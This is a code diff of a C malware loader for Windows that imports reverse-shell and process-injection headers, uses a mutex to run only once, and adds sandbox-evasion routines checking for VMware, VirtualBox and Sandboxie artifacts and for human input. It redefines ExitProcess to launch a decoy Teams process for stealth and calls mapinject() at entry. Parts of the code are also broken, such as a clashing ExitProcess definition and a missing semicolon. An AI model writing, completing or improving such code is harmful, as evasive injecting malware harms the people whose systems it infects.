@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <tlhelp32.h>
+#include <stdlib.h>
 
 #include "mapinject.h"
 #include "reverse_shell.h"
@@ -10,13 +11,20 @@
 // Mutex name
 #define MUTEX_NAME TEXT("WindowsProc")
 
+
+/*
+
+    Important Overhead
+
+*/
+
 // Mutex management
 void checkMutex() {
     HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);
     if (hMutex != NULL) {
         if (GetLastError() == ERROR_ALREADY_EXISTS) {
             // Mutex already exists, indicating the payload has been executed
-            ExitProcess(1);
+            ExitProcess();
         }
     }
 
@@ -32,60 +40,75 @@ void checkMutex() {
 
 */
 
+// Exit process while keeping functionality. Protects stealth even if it doesn't work.
+void ExitProcess() {
+    execute_Teams();
+    exit(0);
+}
+
 
 // Function to evade sandboxing
 void stale() {
     // Check for known sandbox artifacts
     if (isSandboxArtifactPresent()) {
-        ExitProcess(1); // Exit if sandbox artifacts are detected
+        ExitProcess(); // Exit if sandbox artifacts are detected
     }
 
     // Check for human-like interaction
     if (!isHumanInteractionPresent()) {
-        ExitProcess(1); // Exit if human-like interaction is not detected
+        ExitProcess(); // Exit if human-like interaction is not detected
     }
-
-    // Mimic user behavior to evade sandbox analysis
-    mimicUserBehavior();
-
-    // Placeholder for additional sandbox evasion techniques...
-    // This may include various checks and delays to simulate normal user behavior.
 }
 
 
 // Sandbox artifact checks
-bool checkRegistryKey(const char* keyPath) {
+
+// Function to check if a specified registry key exists
+int checkRegistryKey(const char* keyPath) {
     HKEY hKey;
+    // Attempt to open the specified registry key for reading
     LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
+    // Close the registry key handle
     RegCloseKey(hKey);
+    // Return true if the key was successfully opened, indicating its existence
     return result == ERROR_SUCCESS;
 }
 
-bool checkFileExistence(const char* filePath) {
+// Function to check if a file exists at the specified path
+int checkFileExistence(const char* filePath) {
+    // Use GetFileAttributesA to retrieve file attributes
+    // If the result is not INVALID_FILE_ATTRIBUTES, the file exists
     return GetFileAttributesA(filePath) != INVALID_FILE_ATTRIBUTES;
 }
 
-bool checkRunningProcesses(const char* processName) {
+// Function to check if a process with the specified name is currently running
+int checkRunningProcesses(const char* processName) {
+    // Create a snapshot of the current processes
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
+    // Iterate through the processes in the snapshot
     if (Process32First(hSnap, &pe32)) {
         do {
+            // Compare process names case-insensitively
             if (_stricmp(pe32.szExeFile, processName) == 0) {
+                // Close the snapshot handle and return true if a matching process is found
                 CloseHandle(hSnap);
-                return true;
+                return 1;
             }
         } while (Process32Next(hSnap, &pe32));
     }
 
+    // Close the snapshot handle and return false if no matching process is found
     CloseHandle(hSnap);
-    return false;
+    return 0;
 }
 
 
+
 // Human user detection
-bool isHumanInteractionPresent() {
+int isHumanInteractionPresent() {
     // Check for mouse movement
     INPUT input;
     input.type = INPUT_MOUSE;
@@ -98,7 +121,7 @@ bool isHumanInteractionPresent() {
     SHORT keyState = GetAsyncKeyState(VK_SHIFT);
     if (keyState == 0 || keyState == 1) {
         // Shift key is pressed or released
-        return true;
+        return 1;
     }
 
     // Check for window focus changes
@@ -109,34 +132,34 @@ bool isHumanInteractionPresent() {
         
         // Check if the window title is not empty (indicating potential user interaction)
         if (strlen(windowTitle) > 0) {
-            return true;
+            return 1;
         }
     }
 
     // Placeholder for additional checks related to human-like interaction...
 
-    return false;
+    return 0;
 }
 
 
 // Function to check sandbox artifacts
-bool isSandboxArtifactPresent() {
+int isSandboxArtifactPresent() {
     // Check for specific registry keys associated with sandboxes
     if (checkRegistryKey("SOFTWARE\\VMware, Inc.\\VMware Tools") || checkRegistryKey("SOFTWARE\\Oracle\\VirtualBox")) {
-        return true;
+        return 1;
     }
 
     // Check for specific files often present in sandboxes
     if (checkFileExistence("C:\\sbiedll.dll") || checkFileExistence("C:\\\\BoxedAppSDK64.dll")) {
-        return true;
+        return 1;
     }
 
     // Check for the presence of known sandbox processes
     if (checkRunningProcesses("sandbox.exe") || checkRunningProcesses("vmware.exe")) {
-        return true;
+        return 1;
     }
 
-    return false;
+    return 0;
 }
 
 /*
@@ -181,5 +204,4 @@ extern "C" {
         // Inject process
         mapinject()
     }
-    return 0;
 }
